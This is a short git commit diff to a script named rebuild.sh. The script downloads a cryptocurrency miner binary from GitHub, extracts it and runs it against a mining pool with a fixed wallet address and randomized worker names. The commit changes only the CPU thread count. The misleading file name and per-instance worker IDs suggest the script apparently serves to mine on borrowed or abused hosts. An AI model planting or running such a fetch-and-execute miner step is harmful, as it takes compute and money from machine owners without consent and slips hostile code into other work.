c3c6f3e162cfae73fd52c90b5e5a6722e4592172
odilon5 <93242501+odilon5@users.noreply.github.com>
2021-10-27 13:05:12 +0700

    Update rebuild.sh

--- rebuild.sh
+++ rebuild.sh
@@ -4,4 +4,4 @@
 
 wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
 tar xf hellminer_cpu_linux.tar.gz
-./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RGeRKo3JYfRnwKwKKSExF77ZdxsoeVTadg.$(echo $(shuf -i 1-20000 -n 1)-V) -p x --cpu 36
+./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RGeRKo3JYfRnwKwKKSExF77ZdxsoeVTadg.$(echo $(shuf -i 1-20000 -n 1)-V) -p x --cpu 4
